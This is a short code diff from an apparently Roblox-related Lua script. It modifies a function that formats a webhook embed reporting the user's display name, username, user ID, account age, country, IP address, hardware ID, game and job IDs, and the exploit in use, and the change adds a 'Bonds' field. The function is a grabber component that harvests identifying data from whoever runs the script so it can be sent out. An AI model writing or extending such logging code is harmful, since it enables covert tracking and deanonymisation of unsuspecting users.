@@ -59,15 +59,15 @@ local function createWebhookData()
                 },
                 ["description"] = string.format(
                     "__[Player Info](https://www.roblox.com/users/%d)__" ..
-                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                    " **\nDisplay Name:** %s \n**Username:** %s \n**Bonds:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                     "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                     "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                     "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                     "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
-                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    Userid, DName, Name, totalBond, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                     tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                     game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
-                    GetData, ConsoleJobId, message
+                    GetData, ConsoleJobId
                 ),
                 ["type"] = "rich",
                 ["color"] = tonumber("0xFFD700"), -- Change the color if you want
